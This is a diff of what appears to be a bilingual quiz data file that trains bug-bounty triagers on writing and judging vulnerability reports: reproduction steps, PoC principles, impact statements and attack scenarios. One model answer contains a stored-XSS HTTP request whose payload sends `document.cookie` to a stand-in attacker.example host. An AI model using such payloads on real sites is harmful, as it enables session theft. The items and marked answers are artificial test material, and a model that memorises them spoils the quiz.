-                "BBR-Review Dim 4 (**12 pt / one of the heaviest axes**) requires a dedicated **`Environment / Test Accounts` section** (target URL / browser / OS / Attacker creds `user1:pass1` / Victim creds `user2:pass2`), **numbered steps with one action each + a full HTTP request (method/path/headers/body) in code blocks**. Bad signs: prereqs introduced mid-step, single-account IDOR proof, no test creds forcing triager to self-register.",
+              ja: "BBR-Review Dim 4（**12 点 / 最重要軸の一つ**）は、専用の **`Environment / Test Accounts` セクション**（target URL / browser / OS / Attacker creds `user1:pass1` / Victim creds `user2:pass2`）と、**番号付き手順 1 アクション 1 ステップ + 完全 HTTP リクエスト（method/path/headers/body）コードブロック** を要求。Bad sign：『前提が途中で出てくる』『IDOR 検証が単一アカウント』『test creds なしで triager が登録を強制される』。",
+              en: "BBR-Review Dim 4 (**12 pt / one of the heaviest axes**) requires a dedicated **`Environment / Test Accounts` section** (target URL / browser / OS / Attacker creds `user1:pass1` / Victim creds `user2:pass2`), **numbered steps with one action each + a full HTTP request (method/path/headers/body) in code blocks**. Bad signs: prereqs introduced mid-step, single-account IDOR proof, no test creds forcing triager to self-register.",
             },
             question: {
               ja: "Dim 4 で 12 点満点を取れる再現手順はどれですか？",
@@ -2142,17 +2283,13 @@
             choices: [
               {
                 // ◎ ideal — Environment / Test Accounts + 完全 HTTP + numbered
-                ja:
-                  "**Environment:** Chrome 121 / macOS 14.4 / `https://app.example.com`.\n**Test Accounts:** Attacker `u1@example.com:Test123!` (free-tier) / Victim `u2@example.com:Test123!` (free-tier).\n**Steps:**\n1. Attacker でログインし `https://app.example.com/profile/me/edit` を開く。\n2. bio に下記 HTTP を送信:\n```http\nPOST /api/v2/profile HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nCookie: session=<attacker>\n\n{\"bio\":\"<img src=x onerror=fetch('https://attacker.example/?c='+document.cookie)>\"}\n```\n3. 別ブラウザで Victim としてログインし Attacker のプロフィールを開く → payload 発火・cookie が attacker.example に送出（HAR 添付）。",
-                en:
-                  "**Environment:** Chrome 121 / macOS 14.4 / `https://app.example.com`.\n**Test Accounts:** Attacker `u1@example.com:Test123!` (free-tier) / Victim `u2@example.com:Test123!` (free-tier).\n**Steps:**\n1. Log in as Attacker, open `https://app.example.com/profile/me/edit`.\n2. Send the following HTTP to set bio:\n```http\nPOST /api/v2/profile HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nCookie: session=<attacker>\n\n{\"bio\":\"<img src=x onerror=fetch('https://attacker.example/?c='+document.cookie)>\"}\n```\n3. In another browser as Victim, view Attacker's profile → payload fires and the cookie is sent to attacker.example (HAR attached).",
+                ja: '**Environment:** Chrome 121 / macOS 14.4 / `https://app.example.com`.\n**Test Accounts:** Attacker `u1@example.com:Test123!` (free-tier) / Victim `u2@example.com:Test123!` (free-tier).\n**Steps:**\n1. Attacker でログインし `https://app.example.com/profile/me/edit` を開く。\n2. bio に下記 HTTP を送信:\n```http\nPOST /api/v2/profile HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nCookie: session=<attacker>\n\n{"bio":"<img src=x onerror=fetch(\'https://attacker.example/?c=\'+document.cookie)>"}\n```\n3. 別ブラウザで Victim としてログインし Attacker のプロフィールを開く → payload 発火・cookie が attacker.example に送出（HAR 添付）。',
+                en: '**Environment:** Chrome 121 / macOS 14.4 / `https://app.example.com`.\n**Test Accounts:** Attacker `u1@example.com:Test123!` (free-tier) / Victim `u2@example.com:Test123!` (free-tier).\n**Steps:**\n1. Log in as Attacker, open `https://app.example.com/profile/me/edit`.\n2. Send the following HTTP to set bio:\n```http\nPOST /api/v2/profile HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nCookie: session=<attacker>\n\n{"bio":"<img src=x onerror=fetch(\'https://attacker.example/?c=\'+document.cookie)>"}\n```\n3. In another browser as Victim, view Attacker\'s profile → payload fires and the cookie is sent to attacker.example (HAR attached).',
               },
               {
                 // ○ near — 全前提揃うが HTTP がスクショ + test creds 不完全
-                ja:
-                  "Chrome 121 / macOS 14.4 で `u1@example.com` としてログインして bio に payload を保存、`u2@example.com` で確認。HTTP リクエストは Burp スクリーンショットのみで、テストアカウントのパスワードと HAR は添付なし。",
-                en:
-                  "On Chrome 121 / macOS 14.4 log in as `u1@example.com`, save the payload in bio, check as `u2@example.com`. HTTP request only as a Burp screenshot; test account passwords and HAR not attached.",
+                ja: "Chrome 121 / macOS 14.4 で `u1@example.com` としてログインして bio に payload を保存、`u2@example.com` で確認。HTTP リクエストは Burp スクリーンショットのみで、テストアカウントのパスワードと HAR は添付なし。",
+                en: "On Chrome 121 / macOS 14.4 log in as `u1@example.com`, save the payload in bio, check as `u2@example.com`. HTTP request only as a Burp screenshot; test account passwords and HAR not attached.",
               },
               {
                 // △ ordinary — Burp ファイルだけ
@@ -2161,25 +2298,18 @@
               },
               {
                 // × far — 抽象すぎて追試不能
-                ja:
-                  "「ログインすれば自然に分かります」と書き、URL もアカウントも payload も省略する。",
-                en:
-                  "Write \"once you log in, it'll be obvious\" and skip the URL, accounts, and payload.",
+                ja: "「ログインすれば自然に分かります」と書き、URL もアカウントも payload も省略する。",
+                en: 'Write "once you log in, it\'ll be obvious" and skip the URL, accounts, and payload.',
               },
             ],
-            kinds: ["ideal", "near", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 4 満点 (12/12) は **Environment + Test Accounts (attacker/victim) + 1 アクション 1 ステップ + 完全 HTTP テキスト + HAR / 動画 / コマンド** の 5 点全部入り。**スクリーンショットの HTTP は copy-pastable ではないため減点**。テストアカウントが無いと triager が自己登録を強いられ、追試 SLA が大幅に悪化します。",
-                tip:
-                  "**Tip:** 漏れやすいのは『Account role (free / paid / admin)』と『URL のフルパス』。これだけで Dim 4 を 12 → 6 に落としかねません。",
+                ok: "Dim 4 満点 (12/12) は **Environment + Test Accounts (attacker/victim) + 1 アクション 1 ステップ + 完全 HTTP テキスト + HAR / 動画 / コマンド** の 5 点全部入り。**スクリーンショットの HTTP は copy-pastable ではないため減点**。テストアカウントが無いと triager が自己登録を強いられ、追試 SLA が大幅に悪化します。",
+                tip: "**Tip:** 漏れやすいのは『Account role (free / paid / admin)』と『URL のフルパス』。これだけで Dim 4 を 12 → 6 に落としかねません。",
               },
               en: {
-                ok:
-                  "Full 12/12 needs **Environment + Test Accounts (attacker/victim) + one-action-per-step + full HTTP text + HAR/video/cmd**. **Screenshot HTTP loses points** because it's not copy-pastable. Missing test creds forces triagers to self-register, blowing up retest SLA.",
-                tip:
-                  "**Tip:** The two most-skipped fields are *account role (free/paid/admin)* and *full URL path*. Either alone can cost you 12 → 6.",
+                ok: "Full 12/12 needs **Environment + Test Accounts (attacker/victim) + one-action-per-step + full HTTP text + HAR/video/cmd**. **Screenshot HTTP loses points** because it's not copy-pastable. Missing test creds forces triagers to self-register, blowing up retest SLA.",
+                tip: "**Tip:** The two most-skipped fields are *account role (free/paid/admin)* and *full URL path*. Either alone can cost you 12 → 6.",
               },
             },
           },
@@ -2201,14 +2331,12 @@
                 "exploit.py — 200-line script:\n" +
                 " · brute-forces 10,000 other users' accounts\n" +
                 " · saves captured auth tokens to `/tmp/exploits/all_users.csv`\n" +
-                " · ships a \"success!\" email to every account as a side effect\n" +
+                ' · ships a "success!" email to every account as a side effect\n' +
                 " · reporter's own raw session token left unredacted in the script",
             },
             context: {
-              ja:
-                "BBR-Review Dim 5（**12 点**）の **PoC 5 原則** は (1)無害性 (`id`/`whoami`/DNS callback のみ可、`rm -rf` 等 NG) (2)最小性（tracking ヘッダ削除）(3)明確性 (`[+] Vulnerability Confirmed` 出力) (4)自己完結性（標準ライブラリ or 明示的依存）(5)ペイロード‐スクリプト分離 (`XSS_PAYLOAD` 等の変数定義)。**他ユーザーデータへの干渉と生 token 残置は Intigriti `Real PII verification` 違反** で、Dim 11 = 0 ＋ Critical 違反扱いに波及する。",
-              en:
-                "BBR-Review Dim 5 (**12 pt**) **PoC five principles**: (1) Harmlessness (`id`/`whoami`/DNS callback only — never `rm -rf`); (2) Minimality (drop tracking headers); (3) Clarity (explicit `[+] Vulnerability Confirmed`); (4) Self-Containment (stdlib or explicit deps); (5) Payload-Script Separation (variables like `XSS_PAYLOAD`). **Touching other users' data + leaving raw tokens unredacted = Intigriti `Real PII verification` violation**, cascading to Dim 11 = 0 + Critical violation.",
+              ja: "BBR-Review Dim 5（**12 点**）の **PoC 5 原則** は (1)無害性 (`id`/`whoami`/DNS callback のみ可、`rm -rf` 等 NG) (2)最小性（tracking ヘッダ削除）(3)明確性 (`[+] Vulnerability Confirmed` 出力) (4)自己完結性（標準ライブラリ or 明示的依存）(5)ペイロード‐スクリプト分離 (`XSS_PAYLOAD` 等の変数定義)。**他ユーザーデータへの干渉と生 token 残置は Intigriti `Real PII verification` 違反** で、Dim 11 = 0 ＋ Critical 違反扱いに波及する。",
+              en: "BBR-Review Dim 5 (**12 pt**) **PoC five principles**: (1) Harmlessness (`id`/`whoami`/DNS callback only — never `rm -rf`); (2) Minimality (drop tracking headers); (3) Clarity (explicit `[+] Vulnerability Confirmed`); (4) Self-Containment (stdlib or explicit deps); (5) Payload-Script Separation (variables like `XSS_PAYLOAD`). **Touching other users' data + leaving raw tokens unredacted = Intigriti `Real PII verification` violation**, cascading to Dim 11 = 0 + Critical violation.",
             },
             question: {
               ja: "BBR-Review PoC 5 原則 + Intigriti compliance を踏まえた triage 対応は？",
@@ -2222,39 +2350,28 @@
               },
               {
                 // ○ near — 自アカ最小化は依頼するが clarity / payload separation を省略
-                ja:
-                  "「自アカウントのみを対象とする最小 PoC」への差し替え依頼までは行うが、**clarity output（`[+] Confirmed`）と payload-script separation（`XSS_PAYLOAD` 等の変数化）の 2 原則は省略**。生 token の redact だけ依頼する。",
-                en:
-                  "Ask for a minimal self-targeted PoC, but **drop the `[+] Confirmed` clarity output and the `XSS_PAYLOAD` payload-script-separation requirements**. Only ask for the raw token to be redacted.",
+                ja: "「自アカウントのみを対象とする最小 PoC」への差し替え依頼までは行うが、**clarity output（`[+] Confirmed`）と payload-script separation（`XSS_PAYLOAD` 等の変数化）の 2 原則は省略**。生 token の redact だけ依頼する。",
+                en: "Ask for a minimal self-targeted PoC, but **drop the `[+] Confirmed` clarity output and the `XSS_PAYLOAD` payload-script-separation requirements**. Only ask for the raw token to be redacted.",
               },
               {
                 // ◎ ideal — 5 原則 + Intigriti 違反明示
-                ja:
-                  "**自アカウント 1 つのみ** を対象とした最小 PoC への差し替えを依頼: (1) 無害化 — `whoami` / DNS callback のみで実害コマンド NG / (2) 最小化 — tracking cookie・CDN ヘッダ削除 / (3) 明確化 — `[+] Vulnerability Confirmed` 出力 / (4) 自己完結 — 標準ライブラリのみ or 依存明記 / (5) **payload-script 分離** — `XSS_PAYLOAD` 等の変数定義。生 attacker session token は redact 必須。**他者データ収集ロジックは Intigriti `Real PII verification` 違反** として削除依頼。脆弱性自体は受理を維持。",
-                en:
-                  "Request a **minimal PoC against the reporter's own account only**: (1) Harmless — `whoami` / DNS callback only; (2) Minimal — drop tracking cookies / CDN headers; (3) Clear — emit `[+] Vulnerability Confirmed`; (4) Self-contained — stdlib or explicit deps; (5) **Payload-script separation** — variables like `XSS_PAYLOAD`. Raw attacker session tokens must be redacted. **Cross-account collection violates Intigriti's `Real PII verification` rule** — request its removal. Keep the underlying finding open.",
+                ja: "**自アカウント 1 つのみ** を対象とした最小 PoC への差し替えを依頼: (1) 無害化 — `whoami` / DNS callback のみで実害コマンド NG / (2) 最小化 — tracking cookie・CDN ヘッダ削除 / (3) 明確化 — `[+] Vulnerability Confirmed` 出力 / (4) 自己完結 — 標準ライブラリのみ or 依存明記 / (5) **payload-script 分離** — `XSS_PAYLOAD` 等の変数定義。生 attacker session token は redact 必須。**他者データ収集ロジックは Intigriti `Real PII verification` 違反** として削除依頼。脆弱性自体は受理を維持。",
+                en: "Request a **minimal PoC against the reporter's own account only**: (1) Harmless — `whoami` / DNS callback only; (2) Minimal — drop tracking cookies / CDN headers; (3) Clear — emit `[+] Vulnerability Confirmed`; (4) Self-contained — stdlib or explicit deps; (5) **Payload-script separation** — variables like `XSS_PAYLOAD`. Raw attacker session tokens must be redacted. **Cross-account collection violates Intigriti's `Real PII verification` rule** — request its removal. Keep the underlying finding open.",
               },
               {
                 // △ ordinary
-                ja:
-                  "本番で同 PoC を実行して再現確認する（自分でも他ユーザーへの実害を起こす）。",
-                en:
-                  "Run the PoC against production yourself (which itself harms other users).",
+                ja: "本番で同 PoC を実行して再現確認する（自分でも他ユーザーへの実害を起こす）。",
+                en: "Run the PoC against production yourself (which itself harms other users).",
               },
             ],
-            kinds: ["far", "near", "ideal", "ordinary"],
             ex: {
               ja: {
-                ok:
-                  "Dim 5 満点 (12/12) は **5 原則全部入り**。なかでも `payload-script separation` は AI 生成 PoC と人手 PoC を区別する強いシグナルで、`XSS_PAYLOAD` `SQL_PAYLOAD` `RCE_COMMAND` `SSRF_TARGET` などの変数化が文化として定着しています。**他者データ収集ロジック残置のまま受理すると program 側の責任問題に波及** します。",
-                tip:
-                  "**Tip:** Intigriti v1.3 の禁止条項のうち **D. Real PII verification** と **C. Active testing beyond explicit scope** が PoC でよく踏まれます。差し替え依頼時に明文を引用するとレポーター側の納得感が一気に上がります。",
+                ok: "Dim 5 満点 (12/12) は **5 原則全部入り**。なかでも `payload-script separation` は AI 生成 PoC と人手 PoC を区別する強いシグナルで、`XSS_PAYLOAD` `SQL_PAYLOAD` `RCE_COMMAND` `SSRF_TARGET` などの変数化が文化として定着しています。**他者データ収集ロジック残置のまま受理すると program 側の責任問題に波及** します。",
+                tip: "**Tip:** Intigriti v1.3 の禁止条項のうち **D. Real PII verification** と **C. Active testing beyond explicit scope** が PoC でよく踏まれます。差し替え依頼時に明文を引用するとレポーター側の納得感が一気に上がります。",
               },
               en: {
-                ok:
-                  "Dim 5 awards full 12/12 only with **all five principles**. Payload-script separation (`XSS_PAYLOAD`, `SQL_PAYLOAD`, `RCE_COMMAND`, `SSRF_TARGET`…) is a strong signal distinguishing hand-crafted from AI-generated PoCs. **Accepting cross-account collection leaks liability to the program itself.**",
-                tip:
-                  "**Tip:** Intigriti v1.3 forbidden actions **D. Real PII verification** and **C. Active testing beyond scope** are the two most-tripped during PoC review. Quoting them by name when asking for a replacement ends the negotiation faster.",
+                ok: "Dim 5 awards full 12/12 only with **all five principles**. Payload-script separation (`XSS_PAYLOAD`, `SQL_PAYLOAD`, `RCE_COMMAND`, `SSRF_TARGET`…) is a strong signal distinguishing hand-crafted from AI-generated PoCs. **Accepting cross-account collection leaks liability to the program itself.**",
+                tip: "**Tip:** Intigriti v1.3 forbidden actions **D. Real PII verification** and **C. Active testing beyond scope** are the two most-tripped during PoC review. Quoting them by name when asking for a replacement ends the negotiation faster.",
               },
             },
           },
@@ -2270,10 +2387,8 @@
               en: "Very dangerous vulnerability. Catastrophic for the company.",
             },
             context: {
-              ja:
-                "BBR-Review Dim 6（**10 点**）の **self-test**:『この文をそのまま他アプリのレポートに貼っても通用するか？』通用する＝**target-specific でない=書き直し対象**。Bugcrowd 統計では報告の 70% が formulaic Impact。実体は **「ログイン中の任意ユーザーが他ユーザーの未公開ドラフトを read+write できる IDOR」**。公開済み投稿・課金情報・認証情報には届かず、被害規模はドラフト機能を利用する約 50,000 ユーザー。",
-              en:
-                "BBR-Review Dim 6 (**10 pt**) **self-test**: \"Could I paste this unchanged into a report on a different app?\" If yes → not target-specific → rewrite. Bugcrowd data: 70% of Impact statements are formulaic. Actual finding: **an IDOR that lets any logged-in user read & edit other users' private drafts** — published posts, billing, and credentials unaffected; ~50k users impacted.",
+              ja: "BBR-Review Dim 6（**10 点**）の **self-test**:『この文をそのまま他アプリのレポートに貼っても通用するか？』通用する＝**target-specific でない=書き直し対象**。Bugcrowd 統計では報告の 70% が formulaic Impact。実体は **「ログイン中の任意ユーザーが他ユーザーの未公開ドラフトを read+write できる IDOR」**。公開済み投稿・課金情報・認証情報には届かず、被害規模はドラフト機能を利用する約 50,000 ユーザー。",
+              en: 'BBR-Review Dim 6 (**10 pt**) **self-test**: "Could I paste this unchanged into a report on a different app?" If yes → not target-specific → rewrite. Bugcrowd data: 70% of Impact statements are formulaic. Actual finding: **an IDOR that lets any logged-in user read & edit other users\' private drafts** — published posts, billing, and credentials unaffected; ~50k users impacted.',
             },
             question: {
               ja: "BBR-Review Dim 6 の self-test を通る Impact はどれですか？",
@@ -2282,46 +2397,33 @@
             choices: [
               {
                 // ◎ ideal — CIA × prerequisites × blast radius が target-specific に書かれている
-                ja:
-                  "**Confidentiality:** 任意ログインユーザーが他ユーザーの **未公開ドラフト**（タイトル・本文・添付画像）を読取り可能。**Integrity:** 同ドラフトを編集・削除可能（**公開済み投稿には影響なし**）。**Availability:** 影響なし。**前提:** ログイン済み一般ユーザー（権限昇格不要、admin SSO 不要）。**被害規模:** ドラフト機能を有効化している **約 50,000 ユーザー**。",
-                en:
-                  "**Confidentiality:** any logged-in user can read another user's **private drafts** (title, body, attached images). **Integrity:** edit/delete the same (**published posts unaffected**). **Availability:** unaffected. **Prereq:** logged-in basic user (no privilege escalation, no admin SSO). **Blast radius:** **~50,000 users** with drafts enabled.",
+                ja: "**Confidentiality:** 任意ログインユーザーが他ユーザーの **未公開ドラフト**（タイトル・本文・添付画像）を読取り可能。**Integrity:** 同ドラフトを編集・削除可能（**公開済み投稿には影響なし**）。**Availability:** 影響なし。**前提:** ログイン済み一般ユーザー（権限昇格不要、admin SSO 不要）。**被害規模:** ドラフト機能を有効化している **約 50,000 ユーザー**。",
+                en: "**Confidentiality:** any logged-in user can read another user's **private drafts** (title, body, attached images). **Integrity:** edit/delete the same (**published posts unaffected**). **Availability:** unaffected. **Prereq:** logged-in basic user (no privilege escalation, no admin SSO). **Blast radius:** **~50,000 users** with drafts enabled.",
               },
               {
                 // ○ near — CIA に触れているが 1 軸のみ + データ型未指定
-                ja:
-                  "**Confidentiality** に影響あり、被害は約 5 万ユーザー。詳細は本人確認後に共有可能。（CIA 1 軸のみで Integrity / Availability の言及無し、漏洩データの型も未指定）",
-                en:
-                  "**Confidentiality** affected, ~50k users impacted. Further detail available after verification. (Only one CIA axis, no specifics on the leaked data type.)",
+                ja: "**Confidentiality** に影響あり、被害は約 5 万ユーザー。詳細は本人確認後に共有可能。（CIA 1 軸のみで Integrity / Availability の言及無し、漏洩データの型も未指定）",
+                en: "**Confidentiality** affected, ~50k users impacted. Further detail available after verification. (Only one CIA axis, no specifics on the leaked data type.)",
               },
               {
                 // △ ordinary — BBR-Review が Bad example として明示する formulaic Impact
-                ja:
-                  "「Attackers can compromise the application and obtain sensitive information.」 (BBR-Review が Bad example として挙げる formulaic boilerplate)",
-                en:
-                  "\"Attackers can compromise the application and obtain sensitive information.\" (Literal Bad example from BBR-Review — formulaic boilerplate)",
+                ja: "「Attackers can compromise the application and obtain sensitive information.」 (BBR-Review が Bad example として挙げる formulaic boilerplate)",
+                en: '"Attackers can compromise the application and obtain sensitive information." (Literal Bad example from BBR-Review — formulaic boilerplate)',
               },
               {
                 // × far — BBR-Review の Bad example：technical event だけで business context 無し
-                ja:
-                  "「Alert `1` displays.」 (BBR-Review が Bad example として明示する『technical event のみで business context 無し』)",
-                en:
-                  "\"Alert `1` displays.\" (BBR-Review Bad example — a technical event with no business context)",
+                ja: "「Alert `1` displays.」 (BBR-Review が Bad example として明示する『technical event のみで business context 無し』)",
+                en: '"Alert `1` displays." (BBR-Review Bad example — a technical event with no business context)',
               },
             ],
-            kinds: ["ideal", "near", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 6 満点は **CIA 3 行 + 前提 + 被害規模** の 5 点を target-specific に書くこと。Bugcrowd の良い例: *「Stored XSS により、管理者を含む全 viewer の session cookie が窃取され、admin 乗っ取りからシステム全体のデータ改変に至る」*。形容詞ではなく **数値（ユーザー数 / レコード数）・データ型（PII / 課金 / 認証）・権限境界** で具体化します。",
-                tip:
-                  "**Tip:** **Self-test を口に出す** のが効果的：『この impact 文、別アプリのレポートにそのまま貼れる？』で yes なら書き直し。これだけで formulaic ボイラープレートを 70 → 0 に下げられます。",
+                ok: "Dim 6 満点は **CIA 3 行 + 前提 + 被害規模** の 5 点を target-specific に書くこと。Bugcrowd の良い例: *「Stored XSS により、管理者を含む全 viewer の session cookie が窃取され、admin 乗っ取りからシステム全体のデータ改変に至る」*。形容詞ではなく **数値（ユーザー数 / レコード数）・データ型（PII / 課金 / 認証）・権限境界** で具体化します。",
+                tip: "**Tip:** **Self-test を口に出す** のが効果的：『この impact 文、別アプリのレポートにそのまま貼れる？』で yes なら書き直し。これだけで formulaic ボイラープレートを 70 → 0 に下げられます。",
               },
               en: {
-                ok:
-                  "Dim 6 awards full marks for **CIA × prerequisites × blast radius** all written target-specifically. Bugcrowd's gold standard: *\"Stored XSS steals session cookies of every viewer including admins, enabling admin takeover and full system data manipulation.\"* Replace adjectives with **counts (users / records), data types (PII / billing / credentials), and privilege boundaries**.",
-                tip:
-                  "**Tip:** Run the **self-test out loud** — \"Could I paste this Impact verbatim into a different app's report?\" If yes, rewrite. This single check drops formulaic boilerplate from 70% → 0%.",
+                ok: 'Dim 6 awards full marks for **CIA × prerequisites × blast radius** all written target-specifically. Bugcrowd\'s gold standard: *"Stored XSS steals session cookies of every viewer including admins, enabling admin takeover and full system data manipulation."* Replace adjectives with **counts (users / records), data types (PII / billing / credentials), and privilege boundaries**.',
+                tip: '**Tip:** Run the **self-test out loud** — "Could I paste this Impact verbatim into a different app\'s report?" If yes, rewrite. This single check drops formulaic boilerplate from 70% → 0%.',
               },
             },
           },
@@ -2337,10 +2439,8 @@
               en: "An attacker exploits this and gets RCE on production.",
             },
             context: {
-              ja:
-                "BBR-Review Dim 7（**8 点**）は **3 phase 再構成** を要求 — (1) **Preparation (Attacker)**: 必要権限・前提・準備物（payload / attack URL / listener）/ (2) **Execution (Victim)**: 最小被害者操作と前提（ログイン・権限・環境）/ (3) **Result (System)**: 直接技術影響 + business damage (CIA)。**Bugcrowd 統計：初期段階の却下理由は『再現できない』より『攻撃シナリオが非現実的』の方が多い**。実体は **「攻撃者が制作した SVG を管理者がプレビューすると、admin session が攻撃者 Webhook に流出する Stored XSS」**。",
-              en:
-                "BBR-Review Dim 7 (**8 pt**) demands the **three-phase reconstruction** — (1) **Preparation (Attacker)**: required perms, prereqs, prep items (payload / attack URL / listener); (2) **Execution (Victim)**: minimum victim action + prereqs (logged-in, perms, environment); (3) **Result (System)**: direct technical consequence + business damage (CIA). **Bugcrowd data: early-stage rejection is more often \"unrealistic scenario\" than \"cannot reproduce\".** Real finding: **Stored XSS where an admin previewing an attacker-hosted SVG leaks the admin session to attacker.example webhook**.",
+              ja: "BBR-Review Dim 7（**8 点**）は **3 phase 再構成** を要求 — (1) **Preparation (Attacker)**: 必要権限・前提・準備物（payload / attack URL / listener）/ (2) **Execution (Victim)**: 最小被害者操作と前提（ログイン・権限・環境）/ (3) **Result (System)**: 直接技術影響 + business damage (CIA)。**Bugcrowd 統計：初期段階の却下理由は『再現できない』より『攻撃シナリオが非現実的』の方が多い**。実体は **「攻撃者が制作した SVG を管理者がプレビューすると、admin session が攻撃者 Webhook に流出する Stored XSS」**。",
+              en: 'BBR-Review Dim 7 (**8 pt**) demands the **three-phase reconstruction** — (1) **Preparation (Attacker)**: required perms, prereqs, prep items (payload / attack URL / listener); (2) **Execution (Victim)**: minimum victim action + prereqs (logged-in, perms, environment); (3) **Result (System)**: direct technical consequence + business damage (CIA). **Bugcrowd data: early-stage rejection is more often "unrealistic scenario" than "cannot reproduce".** Real finding: **Stored XSS where an admin previewing an attacker-hosted SVG leaks the admin session to attacker.example webhook**.',
             },
             question: {
               ja: "BBR-Review が要求する 3-phase attack scenario として最適なのは？",
@@ -2349,46 +2449,33 @@
             choices: [
               {
                 // × far — Self-XSS を cross-user として誤魔化す（BBR-Review が明示する logical break）
-                ja:
-                  "Self-XSS をそのまま「他ユーザーへの攻撃」として書き直す（BBR-Review Dim 7 が明示する logical break で、Dim 8 とも合わせて 0 点扱い）。",
-                en:
-                  "Recast Self-XSS as a cross-user attack (a literal Dim 7 logical break in BBR-Review, also zeroes Dim 8).",
+                ja: "Self-XSS をそのまま「他ユーザーへの攻撃」として書き直す（BBR-Review Dim 7 が明示する logical break で、Dim 8 とも合わせて 0 点扱い）。",
+                en: "Recast Self-XSS as a cross-user attack (a literal Dim 7 logical break in BBR-Review, also zeroes Dim 8).",
               },
               {
                 // ◎ ideal — 3 phases + realistic distribution + prereqs
-                ja:
-                  "**Phase 1 (Attacker prep):** 攻撃者は無料アカウントを作成し、`attacker.example` に Webhook listener を設置。配布チャネルは SNS DM／メール（**realistic distribution vector**）。\n**Phase 2 (Victim execution):** ログイン中の管理者が、攻撃者の SVG を含む投稿のプレビューリンクを開く（管理ダッシュボードで日常的に行う『新着レポート確認』動作）。\n**Phase 3 (System result):** SVG 内 `<script>` が `document.cookie` を Webhook に送出 → admin セッション奪取（**S:C** で他ユーザーの C/I/A を侵害可能）。",
-                en:
-                  "**Phase 1 (Attacker prep):** Attacker registers a free account and stands up a webhook on `attacker.example`. Distribution: social-media DM / email (**realistic distribution vector**).\n**Phase 2 (Victim execution):** A logged-in admin opens the attacker's preview link from the dashboard's *\"check new submissions\"* routine.\n**Phase 3 (System result):** The SVG's `<script>` exfiltrates `document.cookie` → admin session takeover (**S:C**: cross-user CIA impact possible).",
+                ja: "**Phase 1 (Attacker prep):** 攻撃者は無料アカウントを作成し、`attacker.example` に Webhook listener を設置。配布チャネルは SNS DM／メール（**realistic distribution vector**）。\n**Phase 2 (Victim execution):** ログイン中の管理者が、攻撃者の SVG を含む投稿のプレビューリンクを開く（管理ダッシュボードで日常的に行う『新着レポート確認』動作）。\n**Phase 3 (System result):** SVG 内 `<script>` が `document.cookie` を Webhook に送出 → admin セッション奪取（**S:C** で他ユーザーの C/I/A を侵害可能）。",
+                en: "**Phase 1 (Attacker prep):** Attacker registers a free account and stands up a webhook on `attacker.example`. Distribution: social-media DM / email (**realistic distribution vector**).\n**Phase 2 (Victim execution):** A logged-in admin opens the attacker's preview link from the dashboard's *\"check new submissions\"* routine.\n**Phase 3 (System result):** The SVG's `<script>` exfiltrates `document.cookie` → admin session takeover (**S:C**: cross-user CIA impact possible).",
               },
               {
                 // △ ordinary — 攻撃者準備フェーズを丸ごと省く
-                ja:
-                  "攻撃者の準備フェーズと realistic distribution vector の言及を省き、結果フェーズだけを 1 行で書く。",
-                en:
-                  "Skip the attacker prep phase and the realistic distribution vector; write only the result phase in one line.",
+                ja: "攻撃者の準備フェーズと realistic distribution vector の言及を省き、結果フェーズだけを 1 行で書く。",
+                en: "Skip the attacker prep phase and the realistic distribution vector; write only the result phase in one line.",
               },
               {
                 // ○ near — 3 phases あるが prerequisites と realistic distribution が抜けている
-                ja:
-                  "「攻撃者が SVG をアップロード → 管理者がプレビュー → cookie 流出」（3 phases は揃っているが、**prerequisites と realistic distribution vector の明記が抜けて**おり、Dim 7 で 5/8 程度に留まる）。",
-                en:
-                  "\"Attacker uploads SVG → admin previews → cookie exfil.\" (Three phases present, but **prerequisites and realistic distribution vector are missing**, capping Dim 7 around 5/8.)",
+                ja: "「攻撃者が SVG をアップロード → 管理者がプレビュー → cookie 流出」（3 phases は揃っているが、**prerequisites と realistic distribution vector の明記が抜けて**おり、Dim 7 で 5/8 程度に留まる）。",
+                en: '"Attacker uploads SVG → admin previews → cookie exfil." (Three phases present, but **prerequisites and realistic distribution vector are missing**, capping Dim 7 around 5/8.)',
               },
             ],
-            kinds: ["far", "ideal", "ordinary", "near"],
             ex: {
               ja: {
-                ok:
-                  "Dim 7 満点は **3 phases 全部 + prerequisites + realistic distribution vector**。**『被害者がどんな日常操作でこれを踏むのか』の言語化** は、CVSS の S (Scope) ベクトルを正しく取るためにも必須。BBR-Review が明示する logical break には *Self-XSS を cross-user 攻撃にする / GET-only エンドポイントで CSRF token 窃取と書く / unauth で require-auth エンドポイントを叩く* などがあり、トリアージは即座に Dim 7 = 0 で却下します。",
-                tip:
-                  "**Tip:** Distribution vector の例: SNS DM / 広告ネットワーク / フィッシングメール / SaaS の招待リンク。**「攻撃者が被害者をどう連れてくるか」が書けない時点で Impact は仮想**、として Dim 7 を辛めに採点して構いません。",
+                ok: "Dim 7 満点は **3 phases 全部 + prerequisites + realistic distribution vector**。**『被害者がどんな日常操作でこれを踏むのか』の言語化** は、CVSS の S (Scope) ベクトルを正しく取るためにも必須。BBR-Review が明示する logical break には *Self-XSS を cross-user 攻撃にする / GET-only エンドポイントで CSRF token 窃取と書く / unauth で require-auth エンドポイントを叩く* などがあり、トリアージは即座に Dim 7 = 0 で却下します。",
+                tip: "**Tip:** Distribution vector の例: SNS DM / 広告ネットワーク / フィッシングメール / SaaS の招待リンク。**「攻撃者が被害者をどう連れてくるか」が書けない時点で Impact は仮想**、として Dim 7 を辛めに採点して構いません。",
               },
               en: {
-                ok:
-                  "Dim 7 awards full marks for **3 phases + prerequisites + realistic distribution vector**. Naming the *routine* action that triggers the victim path also keeps the CVSS Scope vector honest. Logical breaks BBR-Review flags by name: *Self-XSS framed as cross-user / GET-based CSRF token theft / unauth exploitation of auth-required endpoints*. Triage closes those at Dim 7 = 0 immediately.",
-                tip:
-                  "**Tip:** Realistic distribution: social DM, ad networks, phishing email, SaaS invite links. **If you can't name how the attacker reaches the victim, the Impact is hypothetical** — score Dim 7 strictly.",
+                ok: "Dim 7 awards full marks for **3 phases + prerequisites + realistic distribution vector**. Naming the *routine* action that triggers the victim path also keeps the CVSS Scope vector honest. Logical breaks BBR-Review flags by name: *Self-XSS framed as cross-user / GET-based CSRF token theft / unauth exploitation of auth-required endpoints*. Triage closes those at Dim 7 = 0 immediately.",
